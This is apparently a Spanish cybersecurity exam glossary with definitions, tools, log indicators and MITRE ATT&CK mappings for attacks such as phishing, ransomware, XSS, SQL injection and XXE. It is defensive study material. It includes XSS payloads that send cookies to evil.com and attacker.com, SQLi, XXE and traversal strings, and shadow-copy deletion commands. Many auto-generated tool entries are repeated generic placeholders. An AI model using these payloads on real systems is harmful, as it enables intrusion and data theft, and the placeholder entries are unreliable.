#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### CCMP (Counter Mode CBC-MAC Protocol)

**Definición:** Protocolo de cifrado en WPA2. Basado en AES. Reemplaza TKIP. Mayor seguridad

**Ejemplos:**
- WPA2 usa CCMP
- Cifrado AES-128
- Integridad con CBC-MAC
- Estandar actual Wi-Fi

#### 🔧 Herramientas (Extension: auto-generated)

**openssl:**  
- Propósito: Operaciones con CCMP (Counter Mode CBC-MAC Protocol)  
- Comando: `openssl [subcommand]`  
- Output: Ver man openssl  

**hashcat:**  
- Propósito: Testing de fortaleza criptográfica  
- Comando: `hashcat -m [mode] hash.txt wordlist.txt`  
- Output: Crackeo de hashes  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4657 (registry value modification) para cambios en crypto settings
- Application logs: SSL/TLS handshake failures
- Syslog: openssl/crypto library errors

---

### Password Manager

**Definición:** Aplicacion que almacena y gestiona contraseñas de forma segura. Cifrado de boveda. Genera contraseñas fuertes. Una contraseña maestra

**Ejemplos:**
- LastPass
- KeePass
- 1Password
- Bitwarden
- Cifrado AES-256
- Autorrelleno de formularios

#### 🔧 Herramientas (Extension: auto-generated)

**openssl:**  
- Propósito: Operaciones con Password Manager  
- Comando: `openssl [subcommand]`  
- Output: Ver man openssl  

**hashcat:**  
- Propósito: Testing de fortaleza criptográfica  
- Comando: `hashcat -m [mode] hash.txt wordlist.txt`  
- Output: Crackeo de hashes  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4657 (registry value modification) para cambios en crypto settings
- Application logs: SSL/TLS handshake failures
- Syslog: openssl/crypto library errors

---

### Dictionary Attack

**Definición:** Ataque de fuerza bruta que usa lista de palabras comunes. Prueba contraseñas probables (diccionario). Mas eficiente que fuerza bruta pura

**Ejemplos:**
- rockyou.txt
- john.txt
- Lista de 10 millones de contraseñas
- Contraseñas comunes (password123, qwerty)

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a Dictionary Attack  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a Dictionary Attack
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con Dictionary Attack  
- Detection: Monitoreo de logs + behavioral analysis  

---

### ML (Machine Learning)

**Definición:** Aprendizaje automatico. IA que aprende de datos sin programacion explicita. Deteccion anomalias, threat hunting

**Ejemplos:**
- Deteccion malware con ML
- Behavioral analysis
- Anomaly detection
- Neural networks
- Supervised/Unsupervised learning

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a ML (Machine Learning)  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a ML (Machine Learning)
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con ML (Machine Learning)  
- Detection: Monitoreo de logs + behavioral analysis  

---

## Dominio 2 Amenazas Vulnerabilidades Mitigaciones

**Peso examen:** 22%  **Términos ALTA prioridad:** 49  

### Threat Actor (Actor de Amenaza)

**Definición:** Entidad que representa una amenaza. Tipos: Nation-state (estado), APT (amenaza persistente avanzada), Hacktivist (activismo), Insider (interno), Script kiddie (aficionado)

**Ejemplos:**
- APT28 (Fancy Bear) - grupo ruso
- Insider malicioso filtrando datos
- Script kiddie usando exploits públicos

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### APT (Advanced Persistent Threat)

**Definición:** Ataque cibernetico sofisticado y prolongado. Bien financiado (nation-states). Objetivo especifico. Persistente en red

**Ejemplos:**
- APT29 (Cozy Bear - Rusia)
- APT28 (Fancy Bear)
- Tacticas de evasion avanzadas
- Meses/años en red sin detectar

#### 🔧 Herramientas (Extension: manual)

**YARA rules:**  
- Propósito: Detectar APT malware por signatures/patterns  
- Comando: `yara -r apt_rules.yar /path/to/scan`  
- Output: Matches de malware conocido  

**Threat Intel Platforms:**  
- Propósito: Correlate IOCs con APT groups conocidos  
- Comando: `Query MISP/ThreatConnect/AlienVault OTX`  
- Output: Attribution a APT28, APT29, Lazarus, etc.  

**Volatility:**  
- Propósito: Memory forensics para detectar APT rootkits  
- Comando: `volatility -f memdump.raw --profile=Win10x64 psscan`  
- Output: Procesos ocultos, hooks  

#### 📊 Log Analysis

**Logs a revisar:**
- Proxy logs: beaconing patterns a C2 (conexiones cada X minutos/horas)
- DNS logs: DGA (Domain Generation Algorithm) queries, tunneling DNS
- Windows: Event ID 4698 (scheduled task), 4720 (user created), 4732 (user added to admin group)
- VPN logs: accesos desde países inusuales, horarios anómalos
- Email gateway: phishing attempts, spear phishing con attachments

**IOC Patterns:**
- Beaconing: conexiones repetitivas cada 60 min a misma IP externa (C2 heartbeat)
- Data staging: archivos .zip/.rar grandes creados en %TEMP% antes de exfiltración
- Lateral movement: PsExec, WMI, RDP desde workstation to workstation (no normal)
- Persistence: scheduled tasks con nombres similares a legítimos (GoogleUpdateTaskMachineUA vs GoogleUpdateTaskMachineUAA)
- Credential dumping: lsass.exe access, reg.exe save HKLM\SAM

**Ejemplo de log:**
```
Proxy Log:
2026-03-03 08:15:23 | workstation42 | 185.141.62.123:443 | HTTPS | 1.2KB out, 0.8KB in
2026-03-03 09:15:24 | workstation42 | 185.141.62.123:443 | HTTPS | 1.1KB out, 0.9KB in
2026-03-03 10:15:22 | workstation42 | 185.141.62.123:443 | HTTPS | 1.3KB out, 0.7KB in
[... pattern continúa cada hora exacta ...]

→ IOC: Beaconing pattern perfecto = C2 communication (APT)
```

#### 🎭 MITRE ATT&CK

**T1053.005 - Scheduled Task**  
- Tactic: Persistence  
- Relevance: APT crea scheduled tasks para persistencia  
- Detection: Event ID 4698, verificar tasks en taskschd.msc  

**T1003.001 - LSASS Memory**  
- Tactic: Credential Access  
- Relevance: Mimikatz/credential dumping  
- Detection: Sysmon Event ID 10 (ProcessAccess) a lsass.exe  

**T1021.001 - Remote Desktop Protocol**  
- Tactic: Lateral Movement  
- Relevance: RDP desde workstation to workstation  
- Detection: Event ID 4624 LogonType=10 desde IPs internas inusuales  

**T1071.001 - Web Protocols**  
- Tactic: Command and Control  
- Relevance: HTTPS C2 beaconing  
- Detection: Proxy logs: conexiones periódicas repetitivas  

**T1041 - Exfiltration Over C2**  
- Tactic: Exfiltration  
- Relevance: Data exfil vía canal C2  
- Detection: Uploads grandes a IP externa sospechosa  

---

### Phishing

**Definición:** Ataque de ingeniería social mediante email fraudulento que simula ser legítimo para robar credenciales o instalar malware

**Ejemplos:**
- Email falso de 'banco' pidiendo verificar cuenta
- Link a página clonada de login
- Adjunto malicioso simulando ser factura

#### 🔧 Herramientas (Extension: manual)

**PhishTool:**  
- Propósito: Análisis de emails sospechosos  
- Comando: `https://app.phishtool.com - subir .eml file`  
- Output: Headers, links, attachments analysis  

**VirusTotal:**  
- Propósito: Escanear attachments/URLs  
- Comando: `curl https://www.virustotal.com/api/v3/files -F file=@attachment.exe`  
- Output: AV detection ratio  

**MXToolbox:**  
- Propósito: Verificar SPF/DKIM/DMARC del sender  
- Comando: `https://mxtoolbox.com/spf.aspx - ingresar domain`  
- Output: Pass/Fail de autenticación email  

#### 📊 Log Analysis

**Logs a revisar:**
- Email gateway logs: sender, recipient, subject, attachment names, SPF/DKIM/DMARC results
- Proxy logs: clicks en URLs de emails (HTTP GET requests post-email delivery)
- EDR: process creation si attachment ejecutado (Event ID 4688, Sysmon 1)
- DNS logs: queries a dominios de phishing kit
- User reports: tickets de help desk reportando emails sospechosos

**IOC Patterns:**
- Sender domain: similar a legítimo pero typo (microsfot.com vs microsoft.com)
- SPF/DKIM fail: email dice ser de CEO pero no pasa validaciones
- Attachment: .zip/.exe/.scr/.js/.vbs con nombre de factura/invoice
- URL: bit.ly/shortened links apuntando a credential harvesting sites
- Urgency language: 'Your account will be suspended', 'Urgent action required'
- Mass sending: mismo email a 100+ users simultáneamente

**Ejemplo de log:**
```
Email Gateway Log:
From: ceo@company-secure.com (FAKE - real: ceo@company.com)
To: finance_team@company.com (50 recipients)
Subject: URGENT: Wire Transfer Needed
Attachment: Invoice_Q1_2026.zip (contains Invoice_Q1_2026.exe)
SPF: FAIL (sender IP not in company.com SPF record)
DKIM: FAIL (signature invalid)
DMARC: FAIL (policy=reject)

→ IOC: Spoofed CEO email + failed auth + malicious attachment = PHISHING
```

#### 🎭 MITRE ATT&CK

**T1566.001 - Spearphishing Attachment**  
- Tactic: Initial Access  
- Relevance: Email con attachment malicioso  
- Detection: Email gateway scanning, EDR al ejecutar attachment  

**T1566.002 - Spearphishing Link**  
- Tactic: Initial Access  
- Relevance: Email con link a credential harvesting  
- Detection: URL filtering, proxy logs, user training  

**T1056.003 - Web Portal Capture**  
- Tactic: Credential Access  
- Relevance: Fake login page captura credenciales  
- Detection: Suspicious domains, SSL cert mismatch, user reports  

---

### Spear Phishing

**Definición:** Phishing dirigido a persona o organización específica. Altamente personalizado con información de OSINT

**Ejemplos:**
- Email al CFO simulando ser del CEO pidiendo transferencia
- Investigación previa en LinkedIn del objetivo

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### BEC (Business Email Compromise)

**Definición:** Ataque sofisticado de phishing dirigido a empresas. Suplanta identidad de ejecutivo o proveedor para transferencias fraudulentas

**Ejemplos:**
- Email falso del CEO pidiendo transferencia urgente
- Factura falsa de proveedor legítimo
- Millones de dólares perdidos

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a BEC (Business Email Compromise)  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a BEC (Business Email Compromise)
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con BEC (Business Email Compromise)  
- Detection: Monitoreo de logs + behavioral analysis  

---

### Impersonation (Suplantación de identidad)

**Definición:** Hacerse pasar por otra persona u organización legítima para ganar confianza y acceso

**Ejemplos:**
- Vestirse como técnico de IT
- Email que parece del CEO
- Página web que imita banco

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Typosquatting (URL Hijacking)

**Definición:** Registro de dominios con errores tipograficos de sitios populares. Explota errores de escritura usuarios. Phishing y distribucion malware

**Ejemplos:**
- gogle.com en vez de google.com
- amazom.com
- fcebook.com
- Captura trafico mal escrito

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a Typosquatting (URL Hijacking)  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a Typosquatting (URL Hijacking)
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con Typosquatting (URL Hijacking)  
- Detection: Monitoreo de logs + behavioral analysis  

---

### Malware

**Definición:** Software malicioso diseñado para dañar, explotar o comprometer sistemas. Tipos: virus, gusano, troyano, ransomware, spyware, rootkit

**Ejemplos:**
- WannaCry (ransomware)
- Emotet (troyano)
- Stuxnet (gusano)

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Ransomware

**Definición:** Malware que cifra archivos de victima. Exige pago (rescate) para clave de descifrado. Doble extorsion: cifrado + amenaza de publicacion

**Ejemplos:**
- WannaCry
- Ryuk
- REvil
- Locky
- Bitcoin payment
- Cifrado AES + RSA
- Atacar backups

#### 🔧 Herramientas (Extension: manual)

**Autoruns:**  
- Propósito: Detectar persistencia de ransomware  
- Comando: `autorunsc.exe -accepteula -a * -c -h`  
- Output: CSV con todos los autostart locations  

**Process Explorer:**  
- Propósito: Identificar proceso de cifrado activo  
- Comando: `procexp.exe (GUI) - buscar alto uso de CPU + escritura masiva`  
- Output: Procesos sospechosos  

**Veeam/Shadow Explorer:**  
- Propósito: Verificar si Shadow Copies fueron eliminadas  
- Comando: `vssadmin list shadows`  
- Output: Lista de snapshots (si vacío = eliminados por ransomware)  

#### 📊 Log Analysis

**Logs a revisar:**
- Windows: Event ID 4688 (process creation) - buscar vssadmin.exe delete shadows
- Sysmon Event ID 11 (file created) - extensiones anómalas (.encrypted, .locked, .crypt)
- Event ID 7045 (service installed) - ransomware suele instalarse como servicio
- File system audit logs: mass file modifications en corto tiempo

**IOC Patterns:**
- Comando: vssadmin delete shadows /all /quiet (elimina backups)
- Comando: wbadmin delete catalog -quiet (elimina Windows Backup)
- Mass file renames: .docx → .docx.encrypted en cientos de archivos simultáneos
- Nota de rescate: README.txt, HOW_TO_DECRYPT.html en múltiples directorios
- Network: conexión a TOR (.onion domains) o C2 conocido

**Ejemplo de log:**
```
EventID=4688 Time=2026-03-03 15:42:11
Process=C:\Windows\System32\vssadmin.exe
CommandLine=vssadmin.exe delete shadows /all /quiet
ParentProcess=C:\Users\Public\update.exe
User=SYSTEM

EventID=11 Time=2026-03-03 15:42:15
TargetFilename=C:\Users\jsmith\Documents\report.docx.locked

EventID=11 Time=2026-03-03 15:42:16
TargetFilename=C:\Users\jsmith\Documents\budget.xlsx.locked
[... +500 archivos en 30 segundos ...]

→ IOC: Eliminación de shadow copies + cifrado masivo = RANSOMWARE ACTIVO
```

#### 🎭 MITRE ATT&CK

**T1486 - Data Encrypted for Impact**  
- Tactic: Impact  
- Relevance: Ransomware cifra archivos  
- Detection: Mass file modifications, extensiones anómalas  

**T1490 - Inhibit System Recovery**  
- Tactic: Impact  
- Relevance: Elimina backups/shadow copies  
- Detection: Event ID 4688 con vssadmin delete, wbadmin delete  

**T1071.001 - Web Protocols**  
- Tactic: Command and Control  
- Relevance: C2 communication vía HTTP/HTTPS  
- Detection: Conexiones a IPs/domains sospechosas, TOR usage  

---

### Troyano (Trojan)

**Definición:** Malware disfrazado de software legítimo. NO se auto-replica. Puerta trasera para el atacante

**Ejemplos:**
- Emotet
- TrickBot
- Aplicación crackeada con malware oculto

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a Troyano (Trojan)  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a Troyano (Trojan)
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con Troyano (Trojan)  
- Detection: Monitoreo de logs + behavioral analysis  

---

### RAT (Remote Access Trojan)

**Definición:** Troyano que permite control remoto completo del sistema comprometido. Acceso backdoor persistente

**Ejemplos:**
- njRAT
- DarkComet
- Control total: webcam, keylogger, robo de archivos

#### 🔧 Herramientas (Extension: auto-generated)

*No hay herramientas específicas documentadas.*

---

### Worm

**Definición:** Malware autorreplicante. Se propaga automaticamente por red sin intervencion humana. Consume recursos de red

**Ejemplos:**
- Morris Worm
- Code Red
- SQL Slammer
- Conficker
- Propagacion por vulnerabilidades
- Saturacion de red

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a Worm  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a Worm
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con Worm  
- Detection: Monitoreo de logs + behavioral analysis  

---

### Botnet

**Definición:** Red de equipos infectados (zombies) controlados remotamente. Usada para DDoS, spam, cryptomining. Comando y control (C2)

**Ejemplos:**
- Mirai botnet
- Zeus botnet
- IoT botnets
- Miles/millones de dispositivos
- C2 server
- IRC/HTTP C2

#### 🔧 Herramientas (Extension: auto-generated)

**tcpdump:**  
- Propósito: Captura de tráfico relacionado con Botnet  
- Comando: `tcpdump -i any -w capture.pcap`  
- Output: Archivo PCAP  

**nmap:**  
- Propósito: Escaneo y detección  
- Comando: `nmap -sV -p- target`  
- Output: Puertos abiertos y servicios  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: conexiones permitidas/denegadas
- Router/Switch logs: cambios en configuración
- NetFlow/sFlow data: análisis de tráfico

---

### C2 (Command and Control)

**Definición:** Servidor que controla malware/bots remotamente. Envía comandos y recibe datos robados

**Ejemplos:**
- Bot se conecta a C2 para recibir instrucciones
- Exfiltración de datos a servidor C2

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a C2 (Command and Control)  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a C2 (Command and Control)
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con C2 (Command and Control)  
- Detection: Monitoreo de logs + behavioral analysis  

---

### SQL Injection (SQLi)

**Definición:** Vulnerabilidad que permite inyectar código SQL malicioso en queries. Compromete base de datos

**Ejemplos:**
- ' OR 1=1-- para bypass de autenticación
- UNION SELECT para extraer datos
- xp_cmdshell para ejecución de comandos en SQL Server

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a SQL Injection (SQLi)  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a SQL Injection (SQLi)
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con SQL Injection (SQLi)  
- Detection: Monitoreo de logs + behavioral analysis  

---

### XSS (Cross-Site Scripting)

**Definición:** Inyeccion de script malicioso en sitio web confiable. Browser del usuario ejecuta script del atacante. Roba cookies/sesiones

**Ejemplos:**
- Reflected XSS: script en URL
- Stored XSS: script guardado en DB
- DOM-based XSS
- Mitigacion: sanitizar input, CSP

#### 🔧 Herramientas (Extension: manual)

**Burp Suite:**  
- Propósito: Testing XSS payloads  
- Comando: `Intruder con payloads: <script>alert(1)</script>, <img src=x onerror=alert(1)>`  
- Output: Respuestas reflejadas  

**OWASP ZAP:**  
- Propósito: Automated XSS scanning  
- Comando: `zap-cli active-scan http://target.com`  
- Output: Vulnerabilidades encontradas  

**XSS Hunter:**  
- Propósito: Blind XSS detection  
- Comando: `Insertar payload con callback: <script src=https://xsshunter.com/YOUR_SUBDOMAIN></script>`  
- Output: Alerta cuando payload ejecuta  

#### 📊 Log Analysis

**Logs a revisar:**
- Web server access logs: <script>, javascript:, onerror, onload en parámetros
- WAF logs: XSS attempts bloqueados
- CSP violation reports: Content Security Policy reporta intentos de ejecutar scripts bloqueados
- Browser error logs (client-side): console errors de scripts bloqueados

**IOC Patterns:**
- Reflected XSS: ?search=<script>alert(document.cookie)</script> en URL
- Stored XSS: comment field con <img src=x onerror=fetch('http://attacker.com/steal?c='+document.cookie)>
- DOM XSS: JavaScript manipula DOM inseguramente
- Polyglot payloads: jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>

**Ejemplo de log:**
```
access.log:
203.0.113.45 - - [03/Mar/2026:15:34:21] "GET /search?q=<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script> HTTP/1.1" 200 5432

CSP violation report:
{
  "csp-report": {
    "document-uri": "https://company.com/profile",
    "violated-directive": "script-src 'self'",
    "blocked-uri": "https://evil.com/malicious.js",
    "source-file": "https://company.com/profile?name=<script src=https://evil.com/malicious.js></script>"
  }
}

→ IOC: XSS attempt blocked by CSP
```

#### 🎭 MITRE ATT&CK

**T1189 - Drive-by Compromise**  
- Tactic: Initial Access  
- Relevance: Stored XSS ejecuta en browser de víctima automáticamente  
- Detection: CSP violations, WAF XSS detection  

**T1539 - Steal Web Session Cookie**  
- Tactic: Credential Access  
- Relevance: XSS roba session cookies vía document.cookie  
- Detection: Monitor HTTP requests a dominios externos con cookies en URL  

---

### CSRF (Cross-Site Request Forgery)

**Definición:** Ataque que engaña a usuario para ejecutar acciones no deseadas en sitio donde esta autenticado. Explota confianza del sitio en navegador

**Ejemplos:**
- Cambiar contraseña sin conocimiento
- Transferencia bancaria forzada
- Mitigacion: CSRF tokens
- SameSite cookies

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a CSRF (Cross-Site Request Forgery)  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a CSRF (Cross-Site Request Forgery)
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con CSRF (Cross-Site Request Forgery)  
- Detection: Monitoreo de logs + behavioral analysis  

---

### RCE (Remote Code Execution)

**Definición:** Vulnerabilidad que permite ejecutar código arbitrario en sistema remoto. Muy crítica (CVSS 9-10)

**Ejemplos:**
- Log4Shell permite RCE
- Exploit que ejecuta comandos del atacante
- Compromiso total del servidor

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a RCE (Remote Code Execution)  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a RCE (Remote Code Execution)
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con RCE (Remote Code Execution)  
- Detection: Monitoreo de logs + behavioral analysis  

---

### XML Injection

**Definición:** Inyeccion de codigo XML malicioso. Manipula parseo de XML. XXE (External Entity) para leer archivos. Ataque a aplicaciones que procesan XML

**Ejemplos:**
- <!ENTITY xxe SYSTEM "file:///etc/passwd">
- Leer archivos internos
- SSRF via XXE
- Deshabilitar external entities

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a XML Injection  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a XML Injection
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con XML Injection  
- Detection: Monitoreo de logs + behavioral analysis  

---

### Directory Traversal

**Definición:** Ataque que accede a archivos fuera de directorio web. Usa secuencias "../" para subir directorios. Lectura de archivos sensibles del sistema

**Ejemplos:**
- ../../etc/passwd
- ../../../windows/system32/config/sam
- Input validation
- Whitelist de archivos permitidos

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a Directory Traversal  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a Directory Traversal
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con Directory Traversal  
- Detection: Monitoreo de logs + behavioral analysis  

---

### Zero-Day

**Definición:** Vulnerabilidad desconocida por el fabricante. No existe parche. Ventana de 0 días para defenderse

**Ejemplos:**
- Log4Shell antes de ser descubierta públicamente
- Exploit usado por APT antes de patch

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a Zero-Day  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a Zero-Day
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con Zero-Day  
- Detection: Monitoreo de logs + behavioral analysis  

---

### DoS (Denial of Service)

**Definición:** Ataque que satura un servicio para hacerlo inaccesible. Desde una sola fuente

**Ejemplos:**
- Ping flood
- SYN flood desde una IP
- Objetivo: hacer caer el servicio

#### 🔧 Herramientas (Extension: auto-generated)

**Wireshark:**  
- Propósito: Detectar tráfico asociado a DoS (Denial of Service)  
- Comando: `wireshark -i eth0 -f 'suspicious_filter'`  
- Output: Capturas PCAP  

**Snort/Suricata:**  
- Propósito: IDS rules para detectar ataque  
- Comando: `alert tcp any any -> any any (msg:'Possible attack'; content:'|pattern|';)`  
- Output: Alertas IDS  

**IOC Patterns:**
- Patrones de tráfico asociados a DoS (Denial of Service)
- Anomalías en logs de aplicación/sistema
- Picos en uso de recursos (CPU/RAM/Network)

#### 🎭 MITRE ATT&CK

**Ver MITRE ATT&CK matrix**  
- Tactic: Initial Access / Execution  
- Relevance: Relacionado con DoS (Denial of Service)  
- Detection: Monitoreo de logs + behavioral analysis  

---

### DDoS (Distributed Denial of Service)

**Definición:** Ataque desde múltiples fuentes (botnet) para saturar un servicio y hacerlo inaccesible. Versión distribuida del DoS

**Ejemplos:**
- Ataque SYN flood desde botnet
- Amplificación DNS/NTP
- Botnet Mirai atacando Dyn (2016)

#### 🔧 Herramientas (Extension: manual)

**netstat / ss:**  
- Propósito: Ver conexiones activas durante DDoS  
- Comando: `netstat -an | grep :80 | wc -l (contar conexiones HTTP)`  
- Output: Número de conexiones  

**tcpdump:**  
- Propósito: Capturar tráfico de DDoS para análisis  
- Comando: `tcpdump -i eth0 -w ddos.pcap -c 10000`  
- Output: PCAP file  

**Cloudflare / Akamai:**  
- Propósito: Mitigar DDoS a nivel CDN  
- Comando: `Enable 'Under Attack Mode' en dashboard`  
- Output: Tráfico malicioso filtrado  

#### 📊 Log Analysis

**Logs a revisar:**
- Firewall logs: spike masivo en conexiones desde múltiples IPs
- Web server access logs: requests/second anormalmente alto
- Load balancer metrics: CPU/bandwidth usage al 100%
- NetFlow data: volumenes de tráfico anómalos
- CDN logs: geolocation de requests (si concentrado en países específicos)

**IOC Patterns:**
- SYN flood: miles de SYN packets sin completar handshake
- HTTP flood: GET / POST requests masivos (cientos por segundo por IP)
- Amplification: small requests resultando en large responses (DNS, NTP, Memcached)
